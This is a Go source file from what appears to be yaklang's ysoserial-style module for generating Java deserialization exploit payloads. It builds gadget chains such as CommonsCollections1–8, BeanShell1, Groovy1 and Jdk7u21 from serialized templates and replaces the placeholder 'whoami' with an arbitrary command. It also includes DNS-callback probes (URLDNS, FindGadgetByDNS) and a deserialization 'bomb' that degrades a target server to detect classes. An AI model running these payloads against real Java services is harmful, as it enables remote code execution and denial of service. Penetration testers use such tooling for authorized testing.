package yso

import (
	"yaklang.io/yaklang/common/utils"
	"yaklang.io/yaklang/common/yserx"
)

const (
	BeanShell1GadgetName              = "BeanShell1"
	CommonsCollections1GadgetName     = "CommonsCollections1"
	CommonsCollections5GadgetName     = "CommonsCollections5"
	CommonsCollections6GadgetName     = "CommonsCollections6"
	CommonsCollections7GadgetName     = "CommonsCollections7"
	CommonsCollectionsK3GadgetName    = "CommonsCollectionsK3"
	CommonsCollectionsK4GadgetName    = "CommonsCollectionsK4"
	Groovy1GadgetName                 = "Groovy1"
	Click1GadgetName                  = "Click1"
	CommonsBeanutils1GadgetName       = "CommonsBeanutils1"
	CommonsBeanutils183NOCCGadgetName = "CommonsBeanutils183NOCC"
	CommonsBeanutils192NOCCGadgetName = "CommonsBeanutils192NOCC"
	CommonsCollections2GadgetName     = "CommonsCollections2"
	CommonsCollections3GadgetName     = "CommonsCollections3"
	CommonsCollections4GadgetName     = "CommonsCollections4"
	CommonsCollections8GadgetName     = "CommonsCollections8"
	CommonsCollectionsK1GadgetName    = "CommonsCollectionsK1"
	CommonsCollectionsK2GadgetName    = "CommonsCollectionsK2"
	JBossInterceptors1GadgetName      = "JBossInterceptors1"
	JSON1GadgetName                   = "JSON1"
	JavassistWeld1GadgetName          = "JavassistWeld1"
	Jdk7u21GadgetName                 = "Jdk7u21"
	Jdk8u20GadgetName                 = "Jdk8u20"
	URLDNS                            = "URLDNS"
	FindGadgetByDNS                   = "FindGadgetByDNS"
	FindClassByBomb                   = "FindClassByBomb"
)

type GadgetInfo struct {
	Name            string
	NameVerbose     string
	Help            string
	SupportTemplate bool
}

func (g *GadgetInfo) GetNameVerbose() string {
	return g.NameVerbose
}
func (g *GadgetInfo) GetName() string {
	return g.Name
}
func (g *GadgetInfo) GetHelp() string {
	return g.Help
}
func (g *GadgetInfo) IsSupportTemplate() bool {
	return g.SupportTemplate
}

var GadgetInfoMap = map[string]*GadgetInfo{
	BeanShell1GadgetName:              {Name: BeanShell1GadgetName, NameVerbose: "BeanShell1", Help: "", SupportTemplate: false},
	Click1GadgetName:                  {Name: Click1GadgetName, NameVerbose: "Click1", Help: "", SupportTemplate: true},
	CommonsBeanutils1GadgetName:       {Name: CommonsBeanutils1GadgetName, NameVerbose: "CommonsBeanutils1", Help: "", SupportTemplate: true},
	CommonsBeanutils183NOCCGadgetName: {Name: CommonsBeanutils183NOCCGadgetName, NameVerbose: "CommonsBeanutils183NOCC", Help: "使用String.CASE_INSENSITIVE_ORDER作为comparator，去除了cc链的依赖", SupportTemplate: true},
	CommonsBeanutils192NOCCGadgetName: {Name: CommonsBeanutils192NOCCGadgetName, NameVerbose: "CommonsBeanutils192NOCC", Help: "使用String.CASE_INSENSITIVE_ORDER作为comparator，去除了cc链的依赖", SupportTemplate: true},
	CommonsCollections1GadgetName:     {Name: CommonsCollections1GadgetName, NameVerbose: "CommonsCollections1", Help: "", SupportTemplate: false},
	CommonsCollections2GadgetName:     {Name: CommonsCollections2GadgetName, NameVerbose: "CommonsCollections2", Help: "", SupportTemplate: true},
	CommonsCollections3GadgetName:     {Name: CommonsCollections3GadgetName, NameVerbose: "CommonsCollections3", Help: "", SupportTemplate: true},
	CommonsCollections4GadgetName:     {Name: CommonsCollections4GadgetName, NameVerbose: "CommonsCollections4", Help: "", SupportTemplate: true},
	CommonsCollections5GadgetName:     {Name: CommonsCollections5GadgetName, NameVerbose: "CommonsCollections5", Help: "", SupportTemplate: false},
	CommonsCollections6GadgetName:     {Name: CommonsCollections6GadgetName, NameVerbose: "CommonsCollections6", Help: "", SupportTemplate: false},
	CommonsCollections7GadgetName:     {Name: CommonsCollections7GadgetName, NameVerbose: "CommonsCollections7", Help: "", SupportTemplate: false},
	CommonsCollections8GadgetName:     {Name: CommonsCollections8GadgetName, NameVerbose: "CommonsCollections8", Help: "", SupportTemplate: true},
	CommonsCollectionsK1GadgetName:    {Name: CommonsCollectionsK1GadgetName, NameVerbose: "CommonsCollectionsK1", Help: "", SupportTemplate: true},
	CommonsCollectionsK2GadgetName:    {Name: CommonsCollectionsK2GadgetName, NameVerbose: "CommonsCollectionsK2", Help: "", SupportTemplate: true},
	CommonsCollectionsK3GadgetName:    {Name: CommonsCollectionsK3GadgetName, NameVerbose: "CommonsCollectionsK3", Help: "", SupportTemplate: false},
	CommonsCollectionsK4GadgetName:    {Name: CommonsCollectionsK4GadgetName, NameVerbose: "CommonsCollectionsK4", Help: "", SupportTemplate: false},
	Groovy1GadgetName:                 {Name: Groovy1GadgetName, NameVerbose: "Groovy1", Help: "", SupportTemplate: false},
	JBossInterceptors1GadgetName:      {Name: JBossInterceptors1GadgetName, NameVerbose: "JBossInterceptors1", Help: "", SupportTemplate: true},
	JSON1GadgetName:                   {Name: JSON1GadgetName, NameVerbose: "JSON1", Help: "", SupportTemplate: true},
	JavassistWeld1GadgetName:          {Name: JavassistWeld1GadgetName, NameVerbose: "JavassistWeld1", Help: "", SupportTemplate: true},
	Jdk7u21GadgetName:                 {Name: Jdk7u21GadgetName, NameVerbose: "Jdk7u21", Help: "", SupportTemplate: true},
	Jdk8u20GadgetName:                 {Name: Jdk8u20GadgetName, NameVerbose: "Jdk8u20", Help: "", SupportTemplate: true},
	URLDNS:                            {Name: URLDNS, NameVerbose: URLDNS, Help: "通过URL对象触发dnslog", SupportTemplate: false},
	FindGadgetByDNS:                   {Name: FindGadgetByDNS, NameVerbose: FindGadgetByDNS, Help: "通过URLDNS这个gadget探测class,进而判断gadget", SupportTemplate: false},
}

type JavaObject struct {
	yserx.JavaSerializable
	verbose *GadgetInfo
}

func (a *JavaObject) Verbose() *GadgetInfo {
	return a.verbose
}

var verboseWrapper = func(y yserx.JavaSerializable, verbose *GadgetInfo) *JavaObject {
	return &JavaObject{
		y,
		verbose,
	}
}

type TemplatesGadget func(options ...GenClassOptionFun) (*JavaObject, error)
type RuntimeExecGadget func(cmd string) (*JavaObject, error)

func ConfigJavaObject(templ []byte, name string, options ...GenClassOptionFun) (*JavaObject, error) {
	config := NewClassConfig(options...)
	if config.ClassType == "" {
		config.ClassType = RuntimeExecClass
	}
	classObj, err := config.GenerateClassObject()
	if err != nil {
		return nil, err
	}
	objs, err := yserx.ParseJavaSerialized(templ)
	if err != nil {
		return nil, err
	}
	obj := objs[0]
	err = SetJavaObjectClass(obj, classObj)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, GadgetInfoMap[name]), nil
}
func setCommandForRuntimeExecGadget(templ []byte, name string, cmd string) (*JavaObject, error) {
	objs, err := yserx.ParseJavaSerialized(templ)
	if err != nil {
		return nil, err
	}
	if len(objs) <= 0 {
		return nil, utils.Error("parse gadget error")
	}
	obj := objs[0]
	err = ReplaceStringInJavaSerilizable(obj, "whoami", cmd, 1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, GadgetInfoMap[name]), nil
}

var allGadgets = []interface{}{GetBeanShell1JavaObject, GetClick1JavaObject, GetCommonsBeanutils1JavaObject, GetCommonsBeanutils183NOCCJavaObject, GetCommonsBeanutils192NOCCJavaObject, GetCommonsCollections1JavaObject, GetCommonsCollections2JavaObject, GetCommonsCollections3JavaObject, GetCommonsCollections4JavaObject, GetCommonsCollections5JavaObject, GetCommonsCollections6JavaObject, GetCommonsCollections7JavaObject, GetCommonsCollections8JavaObject, GetCommonsCollectionsK1JavaObject, GetCommonsCollectionsK2JavaObject, GetCommonsCollectionsK3JavaObject, GetCommonsCollectionsK4JavaObject, GetGroovy1JavaObject, GetJBossInterceptors1JavaObject, GetJSON1JavaObject, GetJavassistWeld1JavaObject, GetJdk7u21JavaObject, GetJdk8u20JavaObject, GetURLDNSJavaObject, GetFindGadgetByDNSJavaObject}

func GetJavaObjectFromBytes(byt []byte) (*JavaObject, error) {
	objs, err := yserx.ParseJavaSerialized(byt)
	if err != nil {
		return nil, err
	}
	if len(objs) <= 0 {
		return nil, utils.Error("parse gadget error")
	}
	obj := objs[0]
	return verboseWrapper(obj, &GadgetInfo{}), nil
}
func GetBeanShell1JavaObject(cmd string) (*JavaObject, error) {
	objs, err := yserx.ParseJavaSerialized(template_ser_BeanShell1)
	if err != nil {
		return nil, err
	}
	if len(objs) <= 0 {
		return nil, utils.Error("parse gadget error")
	}
	obj := objs[0]
	err = ReplaceStringInJavaSerilizable(obj, "whoami1", cmd, 1)
	if err != nil {
		return nil, err
	}
	//err = ReplaceStringInJavaSerilizable(obj, `"whoami1"`, cmd, 1)
	//if err != nil {
	//	return nil, err
	//}
	return verboseWrapper(obj, GadgetInfoMap["BeanShell1"]), nil
}
func GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections1, "CommonsCollections1", cmd)
}
func GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections5, "CommonsCollections5", cmd)
}
func GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections6, "CommonsCollections6", cmd)
}
func GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections7, "CommonsCollections7", cmd)
}
func GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollectionsK3, "CommonsCollectionsK3", cmd)
}
func GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollectionsK4, "CommonsCollectionsK4", cmd)
}
func GetGroovy1JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_Groovy1, "Groovy1", cmd)
}
func GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_Click1, "Click1", options...)
}
func GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsBeanutils1, "CommonsBeanutils1", options...)
}
func GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsBeanutils183NOCC, "CommonsBeanutils183NOCC", options...)
}
func GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsBeanutils192NOCC, "CommonsBeanutils192NOCC", options...)
}
func GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollections2, "CommonsCollections2", options...)
}
func GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollections3, "CommonsCollections3", options...)
}
func GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollections4, "CommonsCollections4", options...)
}
func GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollections8, "CommonsCollections8", options...)
}
func GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollectionsK1, "CommonsCollectionsK1", options...)
}
func GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollectionsK2, "CommonsCollectionsK2", options...)
}
func GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_JBossInterceptors1, "JBossInterceptors1", options...)
}
func GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_JSON1, "JSON1", options...)
}
func GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	//objs, err := yserx.ParseJavaSerialized(template_ser_JavassistWeld1)
	//if err != nil {
	//	return nil, err
	//}
	//obj := objs[0]
	//return verboseWrapper(obj, GadgetInfoMap["JavassistWeld1"]), nil

	return ConfigJavaObject(template_ser_JavassistWeld1, "JavassistWeld1", options...)
}
func GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_Jdk7u21, "Jdk7u21", options...)
}
func GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_Jdk8u20, "Jdk8u20", options...)
}
func GetURLDNSJavaObject(url string) (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(template_ser_URLDNS)
	if err != nil {
		return nil, err
	}
	err = ReplaceStringInJavaSerilizable(obj, "1.1.1.1", url, -1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:            "URLDNS",
		NameVerbose:     "URLDNS",
		SupportTemplate: false,
		Help:            "",
	}), nil
}

func GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(tmeplate_ser_GADGETFINDER)
	if err != nil {
		return nil, err
	}
	err = ReplaceStringInJavaSerilizable(obj, "{{DNSURL}}", url, -1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:            "FindGadgetByDNS",
		NameVerbose:     "FindGadgetByDNS",
		SupportTemplate: false,
		Help:            "",
	}), nil
}

// GetFindClassByBombJavaObject 扫描目标存在指定的 className 时,将会耗部分服务器性能达到间接延时的目的
func GetFindClassByBombJavaObject(className string) (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(tmeplate_ser_FindClassByBomb)
	if err != nil {
		return nil, err
	}
	err = ReplaceClassNameInJavaSerilizable(obj, "{{ClassName}}", className, -1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:            "FindClassByBomb",
		NameVerbose:     "FindClassByBomb",
		SupportTemplate: false,
		Help:            "通过构造反序列化炸弹探测Gadget",
	}), nil
}

func GetSimplePrincipalCollectionJavaObject() (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(template_ser_simplePrincipalCollection)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:            "SimplePrincipalCollection",
		NameVerbose:     "SimplePrincipalCollection",
		SupportTemplate: false,
		Help:            "",
	}), nil
}
func GetAllGadget() []interface{} {
	return allGadgets
}
func GetAllTemplatesGadget() []TemplatesGadget {
	alGadget := []TemplatesGadget{}
	for _, igadget := range allGadgets {
		fun, ok := igadget.(func(options ...GenClassOptionFun) (*JavaObject, error))
		if ok {
			alGadget = append(alGadget, fun)
		}
	}
	return alGadget
}
func GetAllRuntimeExecGadget() []RuntimeExecGadget {
	alGadget := []RuntimeExecGadget{}
	for _, igadget := range allGadgets {
		fun, ok := igadget.(func(cmd string) (*JavaObject, error))
		if ok {
			alGadget = append(alGadget, fun)
		}
	}
	return alGadget
}
